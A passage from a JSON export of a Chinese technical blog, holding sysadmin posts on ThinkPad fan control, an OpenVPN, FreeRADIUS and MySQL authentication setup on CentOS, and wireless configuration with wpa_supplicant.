thinkpad_acpi\\n```\\n\\n\u7136\u540e\u518d\u67e5\u770b\u4e0bproc\u91cc\u9762fan\u6587\u4ef6\u7684\u72b6\u6001\uff1a\\n\\n```\\ncat /proc/acpi/ibm/fan\\n```\\n\\n\u6b64\u65f6\u4f60\u4f1a\u53d1\u73b0\uff0c\u4fe1\u606f\u6709\u53d8\u5316\u3002\\n\\n```\\n[root@server ~]# cat /proc/acpi/ibm/fan\\nstatus: enabled\\nspeed: 5485\\nlevel: auto\\ncommands: level <level> (<level> is 0-7, auto, disengaged, full-speed)\\ncommands: enable, disable\\ncommands: watchdog <timeout> (<timeout> is 0 (off), 1-120 (seconds))\\n```\\n\\n\u7136\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7command\u6765\u63a7\u5236\u98ce\u6247\u7684\u8f6c\u901f\u5566\uff0cauto\u8868\u793a\u81ea\u52a8\uff0cdisengaged\u548cfull-speed\u4e00\u4e2a\u6548\u679c\uff0c\u4e5f\u53ef\u4ee5\u8bbe\u7f6e0-7\u7684\u7b49\u7ea7\uff0c0\u8868\u793a\u505c\u6b62\uff0c\u611f\u5174\u8da3\u53ef\u4ee5\u8bd5\u8bd5\uff0c\u53cd\u6b63\u6211\u4e0d\u6562\u8bd5\uff0c\\n\\n```\\necho \\"level  full-speed\\"  > /proc/acpi/ibm/fan\\n```\\n\u6ce8\u610flevel\u548cfull-speed\u4e4b\u95f4\u53ea\u6709\u4e00\u4e2a\u7a7a\u683c..\\n\\n\u518d\u67e5\u770bfan\u6587\u4ef6\u7684\u72b6\u6001\uff0c\u6216\u8005\u542c\u542c\u98ce\u6247\u8f6c\u52a8\u7684\u58f0\u97f3\uff0c\u4f60\u5c31\u4f1a\u53d1\u73b0\u6709\u660e\u663e\u7684\u53d8\u5316\u4e86\uff0c\u5982\u679c\u6a21\u5757\u6ca1\u6709\u6dfb\u52a0fan_control=1\u7684\u53c2\u6570\u7684\u8bdd\u5f80/proc/acpi/ibm/fan\u91cc\u9762echo\u4fe1\u606f\u662f\u4e0d\u4f1a\u6210\u529f\u7684\uff0c\u4f1a\u62a5\u5982\u4e0b\u9519\u8bef\uff1a\\n\\n```\\n[root@server ~]# echo \\"level 5\\" > /proc/acpi/ibm/fan\\nbash: echo: write error: Invalid argument\\n```\\n\\n\u603b\u7ed3\uff1a\u98ce\u6247\u4f7f\u52b2\u8f6c\u8d77\u6765\u4e86\uff0c\u518d\u4e5f\u4e0d\u7528\u62c5\u5fc3\u624b\u88ab\u70eb\u4f24\u4e86\uff01"},{"id":"/2011/09/02/openvpn-mysql-setup","metadata":{"permalink":"/notes/blog/2011/09/02/openvpn-mysql-setup","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2011-09-02-openvpn-mysql-setup.md","source":"@site/blog/2011-09-02-openvpn-mysql-setup.md","title":"OpenVPN+MySQL\u73af\u5883\u642d\u5efa\u8bb0\u5f55","description":"","date":"2011-09-02T00:00:00.000Z","tags":[{"inline":true,"label":"openvpn","permalink":"/notes/blog/tags/openvpn"},{"inline":true,"label":"freeradius","permalink":"/notes/blog/tags/freeradius"}],"readingTime":7.51,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"OpenVPN+MySQL\u73af\u5883\u642d\u5efa\u8bb0\u5f55","description":"","categories":["system"],"tags":["openvpn","freeradius"]},"unlisted":false,"prevItem":{"title":"\u5982\u4f55\u8ba9ThinkPad\u81ea\u5b9a\u4e49\u98ce\u6247\u8f6c\u901f","permalink":"/notes/blog/2012/05/21/thinkpad-fan-speed-control"},"nextItem":{"title":"\u4f7f\u7528wpa-supplicant\u914d\u7f6e\u65e0\u7ebf\u7f51\u7edc","permalink":"/notes/blog/2011/05/05/centos-wpa-supplicant-wireless"}},"content":"> \u672c\u6587\u8bb0\u5f55\u4e86\u5728centos5.5\u7cfb\u7edf\u4e2d\u642d\u5efaopenvpn+mysql+freeradius\u7684\u8fc7\u7a0b\\n\\n\\n\u7cfb\u7edf\u73af\u5883\uff1acentos5.5\\n\\nEth0\uff1a192.168.0.2\\n\\n\u6821\u51c6\u7cfb\u7edf\u65f6\u95f4\uff1a\\n\\n```\\nntpdate ntp.api.bz\\nhwclock -w\\n```\\n\\n\u6240\u9700\u8f6f\u4ef6\u5305\uff1a\\n\\n```\\nyum install openssl openssl-devel gcc gcc-c++ mysql mysql-devel mysql-server php php-gd php-devel php-pear php-pear-DB php-mysql php-pdo php-cli php-mbstring php-mcrypt httpd\\n```\\n\\n\u4e0b\u8f7d\u6e90\u7801\u5305\uff1a\\n\\n```\\nwget http://www.oberhumer.com/opensource/lzo/download/lzo-2.05.tar.gz\\nwget http://swupdate.openvpn.net/community/releases/openvpn-2.2.0.tar.gz\\nwget ftp://ftp.freeradius.org/pub/freeradius/freeradius-server-2.1.10.tar.gz\\nwget http://sourceforge.net/projects/daloradius/files/daloradius/daloradius0.9-9/daloradius-0.9-9-rc1.tar.gz/download\\nwget http://www.nongnu.org/radiusplugin/radiusplugin_v2.1a_beta1.tar.gz\\nwget http://sourceforge.net/projects/phpmyadmin/files%2FphpMyAdmin%2F2.11.11.3%2FphpMyAdmin-2.11.11.3-all-languages.tar.bz2/download\\n```\\n\\n1.\u5b89\u88c5lzo-2.0.5  \u4f7fopenvpn\u652f\u6301\u538b\u7f29\u529f\u80fd\\n\\n```\\ntar xf lzo-2.05.tar.gz &&cd lzo-*\\n./configure\\nmake && make install\\ncd ..\\n```\\n\\n2.\u5b89\u88c5openvpn\u670d\u52a1\\n\\n```\\ntar xf openvpn-2.2.0.tar.gz &&cd openvpn-*\\n./configure\\nmake && make install\\n```\\n\\n\u590d\u5236\u8bc1\u4e66\u751f\u6210\u6240\u9700\u6587\u4ef6\\n\\n```\\nmkdir /etc/openvpn && cp easy-rsa /etc/openvpn -r\\n```\\n\\n3.\u5b89\u88c5radiusplugin\\n\\n```\\ntar xf radiusplugin_v2.1a_beta1.tar.gz && cd radiusplugin_*\\nmake #\u5c06\u4f1a\u751f\u6210radiusplugin.so \u5c06\u5176cp\u5230/etc/openvpn\u76ee\u5f55\u4e0b\\ncp radiusplugin.cnf /etc/openvpn/conf/\\n```\\n\\n4.\u751f\u6210\u670d\u52a1\u7aef\u6240\u9700\u8bc1\u4e66\\n\\n```\\ncd /etc/openvpn/easy-rsa/2.0/\\nvi vars   #\u7f16\u8f91\u53d8\u91cf\\n.  vars  #source\u547d\u4ee4\u4f7f\u53d8\u91cf\u751f\u6548\\n./clean-all\\n./build-ca  #ca.crt ---Root CA\u8bc1\u4e66\uff0c\u7528\u4e8e\u7b7e\u53d1Server\u548cClient\u8bc1\u4e66\\n./build-key-server server #server.crt server.key-\u521b\u5efa\u5e76\u7b7e\u53d1VPN Server\u4f7f\u7528\u7684CA\\n./build-key client1 #client1.crt client1.key #\u5982\u679c\u5ba2\u6237\u7aef\u9700\u8981\u4f7f\u7528\u8bc1\u4e66\u65b9\u5f0f\u8ba4\u8bc1\u5219\u9700\u8981\u8fd9\u4e2a\u4e1c\u4e1c\uff0c\u521b\u5efa\u5ba2\u6237\u7aef\u8bc1\u4e66\uff0c\u4e00\u4e2a\u5ba2\u6237\u7aef\u4e00\u4e2a\u8bc1\u4e66\\n./build-key client2\\n./build-dh  #dh1024.pem--\u751f\u6210Diffie-Hellman\u6587\u4ef6 ,TLS\u7528\u5230\\nopenvpn --genkey --secret keys/ta.key #\u751f\u6210tls auth key\\n\\n```\\n\u590d\u5236\u8bc1\u4e66\u6587\u4ef6\u5230\u914d\u7f6e\u6587\u4ef6\u76ee\u5f55\\n\\n```\\nmkdir /etc/openvpn/conf && cd keys\\ncp ca.crt server.crt server.key dh1024.pem ta.key /etc/openvpn/conf/\\ntar czf clientkey.tgz ca.crt client1.crt client1.key # \u5982\u679c\u5ba2\u6237\u7aef\u4f7f\u7528\u8bc1\u4e66\u65b9\u5f0f\u8ba4\u8bc1\u5219\u8fd9\u91cc\u9700\u8981\u8fd9\u4e2a\u4e1c\u4e1c\uff0c\u672c\u6587\u4ecb\u7ecd\u7684radius\u65b9\u5f0f\u4e0d\u9700\u8981\u3002 \\n```\\n\\n5.\u7f16\u8f91openvpn\u670d\u52a1\u7aef\u914d\u7f6e\u6587\u4ef6\\n\\nvi /etc/openvpn/conf/server.conf\\n\\n```\\nport 1194\\nproto udp\\ndev tap   #TAP\u8bbe\u5907\u662f\u4e00\u5757\u865a\u62df\u7684\u4ee5\u592a\u7f51\u5361\uff0cTUN\u8bbe\u5907\u662f\u4e00\u4e2a\u865a\u62df\u7684\u70b9\u5230\u70b9IP\u94fe\u63a5\u3002 \\nca /etc/openvpn/conf/ca.crt\\ncert /etc/openvpn/conf/server.crt\\nkey /etc/openvpn/conf/server.key  # This file should be kept secret\\ndh /etc/openvpn/conf/dh1024.pem\\nserver 10.8.0.0 255.255.255.0\\nifconfig-pool-persist ipp.txt\\npush \\"redirect-gateway def1 bypass-dhcp\\"\\npush \\"dhcp-option DNS 10.8.0.1\\"\\npush \\"dhcp-option DNS 208.67.222.222\\"\\npush \\"dhcp-option DNS 208.67.220.220\\"\\nclient-to-client\\nkeepalive 10 120\\n\\ntls-auth /etc/openvpn/conf/ta.key 0\\n\\ncomp-lzo\\nuser nobody\\ngroup nobody\\npersist-key\\npersist-tun\\nstatus openvpn-status.log\\nverb 3\\n\\nclient-to-client #\u5982\u679c\u8ba9Client\u4e4b\u95f4\u53ef\u4ee5\u76f8\u4e92\u770b\u89c1\uff0c\u53bb\u6389\u672c\u884c\u7684\u6ce8\u91ca\u6389\uff0c\u5426\u5219Client\u4e4b\u95f4\u65e0\u6cd5\u76f8\u4e92\u8bbf\u95ee\\n\\n;duplicate-cn  #\u662f\u5426\u5141\u8bb8\u4e00\u4e2aUser\u540c\u65f6\u767b\u5f55\u591a\u6b21\uff0c\u53bb\u6389\u672c\u884c\u6ce8\u91ca\u540e\u53ef\u4ee5\u4f7f\u7528\u540c\u4e00\u4e2a\u7528\u6237\u540d\u767b\u5f55\u591a\u6b21\\n\\nclient-cert-not-required #\u5ba2\u6237\u7aef\u4e0d\u4f7f\u7528CA\u8bc1\u4e66\u9a8c\u8bc1\\n\\nusername-as-common-name #\u4f7f\u7528\u5ba2\u6237\u63d0\u4f9b\u7684UserName\u4f5c\u4e3aCommon Name\\n\\n;max-clients 1000  #\u6700\u5927\u8fde\u63a5\u6570\\n\\nplugin /etc/openvpn/radiusplugin.so /etc/openvpn/conf/radiusplugin.cnf #radius\u63d2\u4ef6\\n\\nscript-security 3\\n```\\n\\n\u7f16\u8f91radius\u63d2\u4ef6\u914d\u7f6e\u6587\u4ef6\\n\\nvi /etc/openvpn/conf/radiusplugin.cnf\\n\\n```\\nNAS-Identifier=OpenVpn\\nService-Type=5\\nFramed-Protocol=1\\nNAS-Port-Type=5\\nNAS-IP-Address=127.0.0.1\\nOpenVPNConfig=/etc/openvpn/conf/server.conf\\nsubnet=255.255.255.0\\noverwriteccfiles=true\\nnonfatalaccounting=false\\nserver\\n{\\n        # The UDP port for radius accounting.\\n        acctport=1813\\n        # The UDP port for radius authentication.\\n        authport=1812\\n        # The name or ip address of the radius server.\\n        name=127.0.0.1\\n        # How many times should the plugin send the if there is no response?\\n        retry=1\\n        # How long should the plugin wait for a response?\\n        wait=1\\n        # The shared secret.\\n        sharedsecret=testpw\\n}\\n```\\n\\n\u542f\u52a8openvpn\\n\\n```\\n/usr/local/sbin/openvpn  --cd /etc/openvpn \\\\\\n --config /etc/openvpn/conf/server.conf &\\n```\\n\\n\u914d\u7f6e\u5185\u6838\u8def\u7531\u8f6c\u53d1\u548ciptables\\n\\n```\\nsysctl -w net.ipv4.ip_forward=1\\niptables -t nat -A POSTROUTING -j MASQUERADE\\niptables -A INPUT -p udp  --dport 1194 -j ACCEPT\\n```\\n\\n6.\u5b89\u88c5freeradius\\n\\n```\\ntar  xf  freeradius-server-2.1.10.tar.bz2\\ncd  freeradius-*\\n./configure\\nmake && make install\\nvi /etc/ld.so.conf\\n#\u52a0\u5165:\\n/usr/local/lib\\n#\u7136\u540e\\nldconfig\\n```\\n\\n\u542f\u52a8mysql\\n\\n```\\n/etc/init.d/mysqld start\\n#\u521d\u59cb\u5316mysql\\nmysql_secure_installation\\nmysql -uroot -p\\ncreate database radius;\\ncd /usr/local/etc/raddb/sql/mysql\\nmysql -uroot -p radius < schema.sql\\nmysql -uroot -p < admin.sql\\n```\\n\\n\u914d\u7f6eradiusd\\n```\\ncd /usr/local/etc/raddb\\nvi radiusd.conf\\n```\\n\\n```\\nprefix = /usr/local\\nexec_prefix = ${prefix}\\nsysconfdir = ${prefix}/etc\\nlocalstatedir = ${prefix}/var\\nsbindir = ${exec_prefix}/sbin\\nlogdir = ${localstatedir}/log/radius\\nraddbdir = ${sysconfdir}/raddb\\nradacctdir = ${logdir}/radacct\\nname = radiusd\\nconfdir = ${raddbdir}\\nrun_dir = ${localstatedir}/run/${name}\\ndb_dir = ${raddbdir}\\nlibdir = ${exec_prefix}/lib\\npidfile = ${run_dir}/${name}.pid\\nmax_request_time = 30\\ncleanup_delay = 5\\nmax_requests = 1024\\nlisten {\\n        type = auth\\n        ipaddr = *\\n        port = 0\\n}\\nlisten {\\n        ipaddr = *\\n        port = 0\\n        type = acct\\n}\\nhostname_lookups = no\\nallow_core_dumps = no\\nregular_expressions     = yes\\nextended_expressions    = yes\\nlog {\\n        destination = files\\n        file = ${logdir}/radius.log\\n        syslog_facility = daemon\\n        stripped_names = no\\n        auth = no\\n        auth_badpass = no\\n        auth_goodpass = no\\n}\\ncheckrad = ${sbindir}/checkrad\\nsecurity {\\n        max_attributes = 200\\n        reject_delay = 1\\n        status_server = yes\\n}\\nproxy_requests  = yes\\n$INCLUDE proxy.conf\\n$INCLUDE clients.conf\\nthread pool {\\n        start_servers = 5\\n        max_servers = 32\\n        min_spare_servers = 3\\n        max_spare_servers = 10\\n        max_requests_per_server = 0\\n}\\nmodules {\\n        $INCLUDE ${confdir}/modules/\\n        $INCLUDE eap.conf\\n        $INCLUDE sql.conf\\n        $INCLUDE sql/mysql/counter.conf\\n        $INCLUDE sqlippool.conf\\n}\\ninstantiate {\\n        exec\\n        expr\\n        expiration\\n        logintime\\n}\\n$INCLUDE policy.conf\\n$INCLUDE sites-enabled/\\n```\\n\\nvi clients.conf\\n\\n```\\nclient localhost {\\n        ipaddr = 127.0.0.1\\n        secret          = testpw\\n        require_message_authenticator = no\\n}\\nclient 192.168.0.2 {\\n        ipaddr = 192.168.0.2\\n        secret          = testpw\\n        require_message_authenticator = no\\n}\\n```\\n\\nvi sites-enabled/default\\n\\n```\\nauthorize {\\n        preprocess\\n        chap\\n        mschap\\n        digest\\n        suffix\\n        eap {\\n                ok = return\\n        }\\n        sql\\n        expiration\\n        logintime\\n        pap\\n}\\nauthenticate {\\n        Auth-Type PAP {\\n                pap\\n        }\\n        Auth-Type CHAP {\\n                chap\\n        }\\n        Auth-Type MS-CHAP {\\n                mschap\\n        }\\n        digest\\n        unix\\n        eap\\n}\\npreacct {\\n        preprocess\\n        acct_unique\\n        suffix\\n        files\\n}\\naccounting {\\n        detail\\n        radutmp\\n        sql\\n        exec\\n        attr_filter.accounting_response\\n}\\nsession {\\n        radutmp\\n}\\npost-auth {\\n        exec\\n        Post-Auth-Type REJECT {\\n                attr_filter.access_reject\\n        }\\n}\\npost-proxy {\\n        eap\\n}\\n```\\n\\nvi  sql.conf\\n\\n```\\nsql {\\n        database = \\"mysql\\"\\n        driver = \\"rlm_sql_${database}\\"\\n        server = \\"localhost\\"\\n        port = 3306\\n        login = \\"radius\\"\\n        password = \\"radpass\\"\\n        radius_db = \\"radius\\"\\n        acct_table1 = \\"radacct\\"\\n        acct_table2 = \\"radacct\\"\\n        postauth_table = \\"radpostauth\\"\\n        authcheck_table = \\"radcheck\\"\\n        authreply_table = \\"radreply\\"\\n        groupcheck_table = \\"radgroupcheck\\"\\n        groupreply_table = \\"radgroupreply\\"\\n        usergroup_table = \\"radusergroup\\"\\n        deletestalesessions = yes\\n        sqltrace = no\\n        sqltracefile = ${logdir}/sqltrace.sql\\n        num_sql_socks = 5\\n        connect_failure_retry_delay = 60\\n        lifetime = 0\\n        max_queries = 0\\n        readclients = yes\\n        nas_table = \\"nas\\"\\n        $INCLUDE sql/${database}/dialup.conf\\n}\\n```\\n\\n\u542f\u52a8radius\uff1a `radiusd  &`\\n\\n\\n\u5b89\u88c5phpmyadmin\u7ba1\u7406mysql\\n```\\ntar xf phpMyAdmin-2.11.11.3-all-languages.tar.gz -C /var/www/\\nmv /var/www/phpMyadmin* /var/www/phpmyadmin && cd /var/www/phpmyadmin\\ncp config.sample.inc.php config.inc.php\\nvi config.inc.php \u4fee\u6539\u4ee5\u4e0b\\n$cfg[\'blowfish_secret\'] = \'ADKFdkfjdl959435dfkds^%&\';\\n```\\n\\n\u5b89\u88c5daloradius\u7ba1\u7406freeradius\\n\\n```\\ntar xf daloradius-0.9-9-rc1.tar.gz -C /var/www/\\ncd /var/www\\nmv daloradius* daloradius\\ncd /var/www/daloradius/contrib/db\\nMysql -uroot -p radius < mysql-daloradius.sql\\nMysql -uroot -p radius < fr2-mysql-daloradius-and-freeradius.sql\\nchown apache:apache /var/www/daloradius -R\\nchmod 644 /var/www/daloradius/library/daloradius.conf .php#\u914d\u7f6e\u6587\u4ef6\u9700\u8981\u7ed9\u4e88\u5199\u6743\u9650\\n```\\n\\nvi /var/www/daloradius/library/daloradius.conf.php\\n```\\n$configValues[\'CONFIG_DB_ENGINE\'] = \'mysql\';\\n$configValues[\'CONFIG_DB_HOST\'] = \'localhost\';\\n$configValues[\'CONFIG_DB_USER\'] = \'radiusadmin\';\\n$configValues[\'CONFIG_DB_PASS\'] = \'radiusadmin\';\\n$configValues[\'CONFIG_DB_NAME\'] = \'radius\';\\n```\\n\\n\u6b64\u5904\u7684radiusadmin\u8d26\u53f7\u662f\u5728phpmyadmin\u91cc\u521b\u5efa\u7684\u5e76\u7ed9\u4e88radius\u5e93\u76f8\u5e94\u64cd\u4f5c\u6743\u9650\uff1b\\n\\n```\\ntouch /tmp/daloradius.log\\nchown apache.apache /tmp/daloradius.log\\n```\\n\\nvi /etc/httpd/conf/httpd.conf\\n\\n```\\nAlias /radius \\"/var/www/daloradius/\\"\\n<Directory /var/www/daloradius/>\\n      Options None\\n      order deny,allow\\n      deny from all\\n      allow from 127.0.0.1\\n      allow from 192.168.0.0/24\\n</Directory>\\nAlias /phpmyadmin \\"/var/www/phpmyadmin/\\"\\n<Directory /var/www/phpmyadmin/>\\n      Options None\\n      order deny,allow\\n      deny from all\\n      allow from 127.0.0.1\\n      allow from 192.168.0.0/24\\n   </Directory>\\n```\\n\\n\u542f\u52a8apache  `/etc/init.d/httpd restart`\\n\\n\u8bbf\u95ee http://192.168.0.2/radius\\n\\nusername: administrator, password: radius\\n\\n\u5728\u7528\u6237\u7ba1\u7406\u91cc\u9762\u6dfb\u52a0\u4e00\u4e2a\u8d26\u53f7\uff0c\u5373\u53ef\u7528\u8fd9\u4e2a\u8d26\u53f7\u8fdb\u884c\u8ba4\u8bc1\u767b\u9646\u3002\\n\\nwindows\u5ba2\u6237\u7aef\u4e0b\u8f7d\uff1ahttp://swupdate.openvpn.net/community/releases/openvpn-2.2.0-install.exe\\n\\n\u4fee\u6539\u914d\u7f6e\u6587\u4ef6X:\\\\Program Files\\\\OpenVPN\\\\config\\\\client.ovpn\\n```\\nclient\\ndev tap\\nproto udp\\nremote 192.168.0.2 1194\\n;remote-random\\nresolv-retry infinite\\nnobind\\npersist-key\\npersist-tun\\nca ca.crt\\nauth-user-pass\\nns-cert-type server\\n;tls-auth ta.key 0\\ncomp-lzo\\nverb 3\\n```\\n\\n\u540c\u65f6\u5c06\u670d\u52a1\u5668\u7aef\u7684ca.crt\u62f7\u8d1d\u5230X:\\\\Program Files\\\\OpenVPN\\\\config\\\\  \u76ee\u5f55\u4e0b\u3002\\nwin7\u9700\u8981\u4ee5\u7ba1\u7406\u5458\u8eab\u4efd\u8fd0\u884cOpenVPN GUI \uff0c\u4f7f\u7528daloradius\u91cc\u6dfb\u52a0\u7684\u8d26\u53f7\u5bc6\u7801\u767b\u9646\u3002\\n\\n\u6dfb\u52a0ipv6\u652f\u6301\uff1a\\n\\n\u8ba9openvpn\u5ba2\u6237\u7aef\u652f\u6301Ipv6\u7f51\u7edc\uff0c\u9700\u8981\u5c06openvpn\u4f7f\u7528\u7684\u865a\u62df\u7f51\u5361\u4e0e\u5177\u6709ipv6\u5730\u5740\u7684\u7269\u7406\u7f51\u5361\u8fdb\u884c\u6865\u63a5\uff0c\u8ba9openvpn\u76d1\u542c\u5728\u6b64\u6865\u63a5\u7684\u865a\u62df\u7f51\u5361\u4e0a\uff0c\u7136\u540e\u901a\u8fc7\u81ea\u52a8DHCP\u5b9e\u73b0\u4e3a\u5ba2\u6237\u7aef\u5206\u914dipv6\u5730\u5740\u3002\\n\\n\u5b89\u88c5\u914d\u7f6e\u7f51\u5361\u6865\u63a5\uff1a\\n\\n```\\nyum  install bridge-utils\\n```\\n\\n\u7f16\u8f91bridge-start\u542f\u52a8\u811a\u672c\uff0c\u6839\u636e\u7cfb\u7edf\u7f51\u7edc\u8bbe\u5907\u5bf9\u5e94\u7f16\u8f91\u3002\\n\\n\u4e0b\u8f7dradvd\uff1ahttp://www.litech.org/radvd/dist/radvd-1.8.tar.gz\\n\\n```\\ntar  xf radvd-* && cd radvd-*\\n./configure --sysconfdir=/etc\\nmake && make install\\n```\\n\\n\u4fee\u6539\u914d\u7f6e\u6587\u4ef6 vi /etc/radvd.conf\\n\\n```\\ninterface br0\\n{\\n    AdvSendAdvert on;\\n    MinRtrAdvInterval 3;\\n    MaxRtrAdvInterval 10;\\n    AdvDefaultPreference low;\\n    prefix 2001:250:1002:40::/64 //\u5ba2\u6237\u7aefIPv6\u524d\u7f00\\n    {\\n        AdvOnLink on;\\n        AdvAutonomous on;\\n        AdvRouterAddr on;\\n    };\\n};\\n```\\n\\n\\n\u53c2\u8003\u6587\u6863\uff1a\\n\\n[Authentication, Authorization & Accounting with FreeRadius & MySQL backend & web based Management with Daloradius](http://howtoforge.org/authentication-authorization-and-accounting-with-freeradius-and-mysql-backend-and-webbased-management-with-daloradius)"},{"id":"/2011/05/05/centos-wpa-supplicant-wireless","metadata":{"permalink":"/notes/blog/2011/05/05/centos-wpa-supplicant-wireless","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2011-05-05-centos-wpa-supplicant-wireless.md","source":"@site/blog/2011-05-05-centos-wpa-supplicant-wireless.md","title":"\u4f7f\u7528wpa-supplicant\u914d\u7f6e\u65e0\u7ebf\u7f51\u7edc","description":"","date":"2011-05-05T00:00:00.000Z","tags":[{"inline":true,"label":"wpa-supplicant","permalink":"/notes/blog/tags/wpa-supplicant"},{"inline":true,"label":"wireless","permalink":"/notes/blog/tags/wireless"}],"readingTime":1.52,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"\u4f7f\u7528wpa-supplicant\u914d\u7f6e\u65e0\u7ebf\u7f51\u7edc","description":"","categories":["system"],"tags":["wpa-supplicant","wireless"]},"unlisted":false,"prevItem":{"title":"OpenVPN+MySQL\u73af\u5883\u642d\u5efa\u8bb0\u5f55","permalink":"/notes/blog/2011/09/02/openvpn-mysql-setup"},"nextItem":{"title":"\u4e3aBash\u589e\u52a0\u547d\u4ee4\u6267\u884c\u65e5\u5fd7","permalink":"/notes/blog/2011/02/17/bash-history-logging"}},"content":"> \u4e4b\u524d\u5728\u4f7f\u7528\u684c\u9762\u7684\u8fc7\u7a0b\u4e2d\uff0c\u53d1\u73b0\u5982\u679c\u9700\u8981\u8fde\u63a5\u65e0\u7ebf\u7f51 \uff0c \u90a3\u4e48networkmanager\u662f\u9996\u9009\u7684\uff0c\u81ea\u52a8\u7ba1\u7406\u7f51\u5361\uff0c\u81ea\u52a8\u626b\u63cf\u4fe1\u53f7\uff0c\u7528\u8d77\u6765\u5404\u79cd\u8212\u670d\uff1b\u4f46\u662f\u7a81\u7136\u6709\u4e00\u5929\u53d1\u73b0networkmanager\u5e72\u4e86\u67d0\u4e9b\u6211\u4e0d\u671f\u671b\u5b83\u5e72\u7684\u4e8b\u60c5\uff0c\u4e8e\u662f\u679c\u65adyum remove\u4e4b\uff0c\u7531\u4e8e\u4e00\u6c14\u4e4b\u4e0bremove\u6389\u4e86networkmanager\uff0c\u5e76\u6ca1\u6709\u8003\u8651\u5230\u8fd8\u5f97\u7528\u5b83\u6765\u8fde\u63a5\u65e0\u7ebf\uff0c\u5bfc\u81f4\u540e\u6765\u53d1\u73b0\u9700\u8981\u8fde\u65e0\u7ebf\u7684\u65f6\u5019\u6781\u4e3a\u4e0d\u65b9\u4fbf\uff0c\u6700\u7ec8\u53d1\u73b0\u53ef\u4ee5\u4f7f\u7528wpa-supplicant\u6765\u7ba1\u7406\u65e0\u7ebf\u7f51\u7edc\u8fde\u63a5\u3002\\n\\n\\n\\n\u5176\u5b9e\u5f88\u591a\u4eba\u90fd\u63a8\u8350\u7528\u8fd9\u4e2a\u4e86wpa_supplicant\uff0c\u4f46\u662f\u7531\u4e8e\u4e00\u76f4\u6ca1\u6709\u8fd9\u4e2a\u5fc5\u8981\u6240\u4ee5\u5c31\u4e00\u76f4\u6ca1\u6709\u5b66\u4f1a\u4f7f\u7528\uff0c\u4eca\u5929\u7528\u4e86\u4e0b\u611f\u89c9\u8fd8\u771f\u4e0d\u9519\u3002 wpa_supplicant\u9996\u5148\u5728/etc/init.d/wpa_supplicant \u6709\u4e00\u4e2a\u542f\u52a8\u63a7\u5236\u811a\u672c\uff0c\u7136\u540e\u6709/etc/wpa_supplicant/wpa_supplicant.conf\u8fd9\u4e2a\u9ed8\u8ba4\u914d\u7f6e\u6587\u4ef6\uff0c\u8fd8\u6709\u4e00\u4e2a/etc/sysconfig/wpa_supplicant\u7684\u5168\u5c40\u914d\u7f6e\u6587\u4ef6\uff0c\\n\\n### \u5b89\u88c5\\n\u4f7f\u7528yum\u5b89\u88c5\uff1a`yum install wpa_supplicant`\uff0c\u5728/usr/share/doc\u4e0b\u6709\u5927\u91cf\u7684\u914d\u7f6e\u793a\u4f8b\u548c\u6587\u6863\uff0c\\n\\n### \u914d\u7f6e\\n\u5728\u4f7f\u7528\u5b83\u4e4b\u524d\u9700\u8981\u4fee\u6539\u51e0\u4e2a\u914d\u7f6e\u6587\u4ef6\uff0c\u9996\u5148\u662fwpa_supplicant.conf  ,\u6bd4\u5982\u6211\u7684\u914d\u7f6e\u5982\u4e0b:\\n\\n```\\n# cat /etc/wpa_supplicant/wpa_supplicant.conf\\nctrl_interface=/var/run/wpa_supplicant\\nctrl_interface_group=wheel\\nnetwork={\\nssid=\\"yourssid\\"\\n#scan_ssid=1\\nproto=WPA2\\nkey_mgmt=WPA-PSK\\npairwise=CCMP\\ngroup=CCMP\\npsk=\\"fightandfuck\\"\\npriority=2\\n}\\n```\\n\\n\u5173\u4e8e\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5148\u4f7f\u7528`iwlist  wlan0 scan` \u547d\u4ee4\u626b\u63cf\uff0c\u5e76\u505a\u76f8\u5e94\u8c03\u6574\u3002\u7136\u540e\u9700\u8981\u4fee\u6539\u5168\u5c40\u914d\u7f6e\u6587\u4ef6\\n\\ncat /etc/sysconfig/wpa_supplicant\\n\\n```\\nINTERFACES=\\"-iwlan0\\"\\nDRIVERS=\\"-Dwext\\"\\nOTHER_ARGS=\\"-f /var/log/wpa_supplicant.log -P /var/run/wpa_supplicant.pid\\"\\n```\\n### \u542f\u52a8\\n\u4fee\u6539\u5b8c\u8fd9\u4e9b\u540e\uff0c\u5373\u53ef\u4f7f\u7528`service wpa_supplicant start` \u542f\u52a8\u7f51\u5361\u5e76\u8fde\u63a5\u8ba4\u8bc1\u4e86\uff0c\u5f53\u7136\u53ef\u80fd\u51fa\u73b0\u7684\u60c5\u51b5\u662f\u8ba4\u8bc1\u6210\u529f\u4e86\u4f46\u662f\u7f51\u5361\u6ca1\u6709\u83b7\u53d6\u5230ip\u5730\u5740\uff0c\u8fd9\u4e2a\u65f6\u5019\u53ea\u9700\u8981\u624b\u52a8dhclient\u4e00\u4e0b\u6216\u8005\u5199\u4e2aifcfg-wlan0\u5e76\u6307\u5b9a\u5176\u4f7f\u7528dhcp\u7136\u540eifup wlan0\u3002\\n\\n\u603b\u4e4b\uff0c\u65b9\u4fbf\u9002\u7528\u3002"},{"id":"/2011/02/17/bash-history-logging","metadata":{"permalink":"/notes/blog/2011/02/17/bash-history-logging","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2011-02-17-bash-history-logging.md","source":"@site/blog/2011-02-17-bash-history-logging.md","title":"\u4e3aBash\u589e\u52a0\u547d\u4ee4\u6267\u884c\u65e5\u5fd7","description":"descripts a method for adding history logging on bash shell","date":"2011-02-17T00:00:00.000Z","tags":[{"inline":true,"label":"bash","permalink":"/notes/blog/tags/bash"},{"inline":true,"label":"hitory logging","permalink":"/notes/blog/tags/hitory-logging"}],"readingTime":9.35,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"\u4e3aBash\u589e\u52a0\u547d\u4ee4\u6267\u884c\u65e5\u5fd7","description":"descripts a method for adding history logging on bash shell","categories":["shell"],"tags":["bash","hitory logging"],"redirect_from":["/2011/02/17/"]},"unlisted":false,"prevItem":{"title":"\u4f7f\u7528wpa-supplicant\u914d\u7f6e\u65e0\u7ebf\u7f51\u7edc","permalink":"/notes/blog/2011/05/05/centos-wpa-supplicant-wireless"}},"content":"> 